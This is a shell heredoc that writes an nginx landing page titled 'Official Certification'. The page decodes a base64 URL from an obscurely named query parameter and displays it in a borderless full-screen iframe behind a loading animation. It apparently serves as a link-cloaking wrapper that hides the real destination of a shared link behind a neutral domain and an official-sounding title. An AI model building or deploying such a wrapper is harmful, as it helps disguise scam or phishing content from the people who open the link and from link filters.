cat > /usr/share/nginx/html/index.html << EOF
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
  <meta content="yes" name="apple-mobile-web-app-capable">
  <meta content="yes" name="apple-touch-fullscreen">
  <meta content="black" name="apple-mobile-web-app-status-bar-style">
  <meta content="320" name="MobileOptimized">
  <title>官方认证</title>
  <style>
    /* 三点加载动画样式 */
    .container {
      width: 100px;
      height: 100px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: rotate-move 2s ease-in-out infinite;
      z-index: 10001; /* 加载动画在最上层 */
    }

    .dot {
      width: 15px;
      height: 15px;
      border-radius: 50%;
      background-color: #000;
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      margin: auto;
    }

    .dot-3 { background-color: #f74d75; animation: dot-3-move 2s ease infinite; }
    .dot-2 { background-color: #10beae; animation: dot-2-move 2s ease infinite; }
    .dot-1 { background-color: #ffe386; animation: dot-1-move 2s ease infinite; }

    @keyframes dot-3-move {
      20% { transform: scale(1) }
      45% { transform: translateY(-18px) scale(.45) }
      60% { transform: translateY(-25px) scale(.45) }
      80% { transform: translateY(-25px) scale(.45) }
      100% { transform: translateY(0px) scale(1) }
    }

    @keyframes dot-2-move {
      20% { transform: scale(1) }
      45% { transform: translate(-16px, 12px) scale(.45) }
      60% { transform: translate(-20px, 15px) scale(.45) }
      80% { transform: translate(-20px, 15px) scale(.45) }
      100% { transform: translateY(0px) scale(1) }
    }

    @keyframes dot-1-move {
      20% { transform: scale(1) }
      45% { transform: translate(16px, 12px) scale(.45) }
      60% { transform: translate(20px, 15px) scale(.45) }
      80% { transform: translate(20px, 15px) scale(.45) }
      100% { transform: translateY(0px) scale(1) }
    }

    @keyframes rotate-move {
      55% { transform: translate(-50%, -50%) rotate(0deg) }
      80% { transform: translate(-50%, -50%) rotate(360deg) }
      100% { transform: translate(-50%, -50%) rotate(360deg) }
    }

    /* iframe样式 */
    .content {
      height: 100%;
      width: 100%;
      position: fixed;
      left: -2px;
      top: -2px;
      z-index: 1; /* iframe在最底层 */
    }
  </style>
</head>
<body>
  <!-- 加载动画容器 -->
  <div class="container" id="container">
    <div class="dot dot-1"></div>
    <div class="dot dot-2"></div>
    <div class="dot dot-3"></div>
  </div>

  <script>
    // 处理URL参数
    var liugao = new URLSearchParams(window.location.search);
    var encodedParam = liugao.get('cuican');
    var liu = atob(encodedParam);

    // 检查是否有有效的URL
    if (liu.includes("http")) {
      var square = document.getElementById("container");
      setTimeout(function() {
        square.style.display = "none";
      }, 1500);

      // 创建iframe并加载内容
      var iframe = document.createElement('iframe');
      iframe.className = 'content';
      iframe.src = liu;
      document.body.appendChild(iframe);

      // 监听iframe加载完成事件
      iframe.onload = function() {
        // 向iframe发送消息
        iframe.contentWindow.postMessage('Hello from parent page', liu);
      };

      // 监听来自iframe的消息
      window.addEventListener('message', function(event) {
        // 验证消息来源
        if (event.origin === new URL(liu).origin) {
          console.log('Message received from iframe:', event.data);
          // 在这里处理来自iframe的消息
        }
      });

      console.log(liu);
    } else {
      console.log("nourls");
      // 如果没有有效URL，隐藏加载动画
      document.getElementById("container").style.display = "none";
    }
  </script>

  <script>
    var firefox = navigator.userAgent.indexOf('Firefox') != -1;

    // 鼠标滚轮事件处理
    function MouseWheel(e, doc) {
      e.preventDefault && e.preventDefault();
      e.returnValue = false;
      var up = firefox && e.detail < 0 || e.wheelDelta > 0;
      doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
    }

    // 绑定鼠标滚轮事件
    function bindMouseWhee(ifr) {
      try {
        var doc = ifr.contentWindow.document;
        if (firefox) {
          doc.addEventListener('DOMMouseScroll', function(e) {
            MouseWheel(e, doc);
          }, false);
        } else {
          doc.onmousewheel = function(e) {
            MouseWheel(e || ifr.contentWindow.event, doc);
          };
        }
      } catch (e) {
        alert('跨域无法获取iframe加载document' + e);
      }
    }
  </script>
</body>
</html>
EOF
